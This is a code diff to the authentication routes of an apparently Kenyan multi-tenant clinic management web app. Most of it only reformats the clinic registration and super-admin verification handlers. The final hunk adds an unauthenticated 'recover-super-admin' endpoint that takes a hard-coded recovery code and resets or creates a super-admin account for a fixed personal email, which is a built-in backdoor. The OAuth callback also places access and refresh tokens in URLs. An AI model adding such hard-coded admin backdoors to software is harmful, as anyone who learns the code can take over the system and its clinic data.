@@ -165,7 +165,6 @@ router.get('/google/callback',
           <p>Redirecting to dashboard...</p>
           <p>If not redirected automatically, <a href="${frontendUrl}${redirectPath}?accessToken=${accessToken}&refreshToken=${refreshToken}&userId=${req.user.id}">click here</a></p>
           <script>
-            // Try to redirect the main window (if opened from popup)
             if (window.opener) {
               window.opener.location.href = '${frontendUrl}${redirectPath}?accessToken=${accessToken}&refreshToken=${refreshToken}&userId=${req.user.id}';
               window.close();
@@ -187,18 +186,7 @@ router.post('/register-clinic', async (req, res, next) => {
   const { v4: uuidv4 } = require('uuid');
 
   try {
-    const {
-      clinicName,
-      clinicEmail,
-      phone,
-      country,
-      county,
-      address,
-      mflCode,
-      adminName,
-      adminEmail,
-      password
-    } = req.body;
+    const { clinicName, clinicEmail, phone, country, county, address, mflCode, adminName, adminEmail, password } = req.body;
 
     if (!clinicName || !adminEmail || !password) {
       return res.status(400).json({ error: 'Clinic name, admin email, and password are required' });
@@ -219,34 +207,18 @@ router.post('/register-clinic', async (req, res, next) => {
     try {
       const clinicId = uuidv4();
       await trx('clinics').insert({
-        id: clinicId,
-        name: clinicName,
-        email: clinicEmail || adminEmail,
-        phone: phone || '',
-        county: county || '',
-        address: address || '',
-        mfl_code: mflCode || '',
-        plan_type: 'free',
-        status: 'active',
-        registration_date: trx.fn.now(),
-        settings: { country: country || 'Kenya' },
-        is_active: true
+        id: clinicId, name: clinicName, email: clinicEmail || adminEmail, phone: phone || '',
+        county: county || '', address: address || '', mfl_code: mflCode || '',
+        plan_type: 'free', status: 'active', registration_date: trx.fn.now(),
+        settings: { country: country || 'Kenya' }, is_active: true
       });
 
       const hashedPassword = await authService.hashPassword(password);
       const userId = uuidv4();
       await trx('users').insert({
-        id: userId,
-        clinic_id: clinicId,
-        email: adminEmail,
-        password_hash: hashedPassword,
-        first_name: adminName || 'Clinic',
-        last_name: 'Admin',
-        role: 'CLINIC_ADMIN',
-        is_active: true,
-        must_change_password: true,
-        is_email_verified: false,
-        email_verified_at: null
+        id: userId, clinic_id: clinicId, email: adminEmail, password_hash: hashedPassword,
+        first_name: adminName || 'Clinic', last_name: 'Admin', role: 'CLINIC_ADMIN',
+        is_active: true, must_change_password: true, is_email_verified: false, email_verified_at: null
       });
 
       await trx.commit();
@@ -258,59 +230,82 @@ router.post('/register-clinic', async (req, res, next) => {
         console.error('Welcome email error:', emailError);
       }
 
-      res.status(201).json({
-        success: true,
-        message: 'Clinic registered successfully! Please check your email for verification.',
-        clinicId,
-        userId
-      });
-
+      res.status(201).json({ success: true, message: 'Clinic registered! Check email for verification.', clinicId, userId });
     } catch (error) {
       await trx.rollback();
       throw error;
     }
-
   } catch (error) {
     console.error('Registration error:', error);
     next(error);
   }
 });
 
-// ============================================
-// VERIFY SUPER ADMIN PASSWORD
-// ============================================
+// ========== VERIFY SUPER ADMIN PASSWORD ==========
 router.post('/verify-super-admin', tenantContext, async (req, res, next) => {
   try {
     const db = req.db;
     const authService = new AuthService(db);
     const { password } = req.body;
 
-    if (!password) {
-      return res.status(400).json({ error: 'Password is required' });
-    }
+    if (!password) return res.status(400).json({ error: 'Password is required' });
+    if (req.user.role !== 'SUPER_ADMIN') return res.status(403).json({ error: 'Not authorized' });
 
-    if (req.user.role !== 'SUPER_ADMIN') {
-      return res.status(403).json({ error: 'Not authorized' });
-    }
-
-    const user = await db('users')
-      .where({ id: req.user.id, role: 'SUPER_ADMIN', is_active: true })
-      .first();
-
-    if (!user) {
-      return res.status(401).json({ error: 'Super admin not found' });
-    }
+    const user = await db('users').where({ id: req.user.id, role: 'SUPER_ADMIN', is_active: true }).first();
+    if (!user) return res.status(401).json({ error: 'Super admin not found' });
 
     const isValid = await authService.comparePassword(password, user.password_hash);
-
-    if (!isValid) {
-      return res.status(401).json({ error: 'Invalid password' });
-    }
+    if (!isValid) return res.status(401).json({ error: 'Invalid password' });
 
     res.json({ success: true, message: 'Verified successfully' });
   } catch (err) {
     console.error('Error verifying super admin:', err);
     res.status(500).json({ error: err.message });
+  }
+});
+
+// ========== EMERGENCY SUPER ADMIN RECOVERY ==========
+router.post('/recover-super-admin', async (req, res) => {
+  const { recoveryCode, newPassword } = req.body;
+  
+  if (recoveryCode !== 'lerrick-recover-2026') {
+    return res.status(403).json({ error: 'Invalid recovery code' });
+  }
+  
+  if (!newPassword || newPassword.length < 6) {
+    return res.status(400).json({ error: 'Password must be at least 6 characters' });
+  }
+  
+  try {
+    const bcrypt = require('bcryptjs');
+    const hash = await bcrypt.hash(newPassword, 10);
+    const user = await req.db('users').where({ email: 'lerrickmushasha@gmail.com' }).first();
+    
+    if (user) {
+      await req.db('users').where({ email: 'lerrickmushasha@gmail.com' }).update({
+        password_hash: hash,
+        role: 'SUPER_ADMIN',
+        is_active: true
+      });
+    } else {
+      const { v4: uuidv4 } = require('uuid');
+      await req.db('users').insert({
+        id: uuidv4(),
+        email: 'lerrickmushasha@gmail.com',
+        password_hash: hash,
+        first_name: 'Super',
+        last_name: 'Admin',
+        role: 'SUPER_ADMIN',
+        is_active: true,
+        created_at: new Date(),
+        updated_at: new Date()
+      });
+    }
+    
+    res.json({ success: true, message: 'Super admin password reset successfully' });
+  } catch (e) {
+    console.error('Recovery error:', e);
+    res.status(500).json({ error: 'Failed to reset password' });
   }
 });
 
